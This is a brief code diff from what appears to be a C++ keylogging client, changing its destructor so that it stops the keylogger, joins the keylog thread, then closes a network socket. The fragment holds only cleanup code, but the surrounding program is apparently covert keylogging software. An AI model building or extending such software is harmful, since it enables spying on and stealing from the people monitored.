@@ -110,7 +110,8 @@ Client::~Client()
 {
     if (this->_keylogThread.joinable())
     {
-        this->stopKeylog();
+        if (this->stopKeylog())
+            this->_keylogThread.join();
     }
     close(this->sockfd);
     #ifdef _WIN32
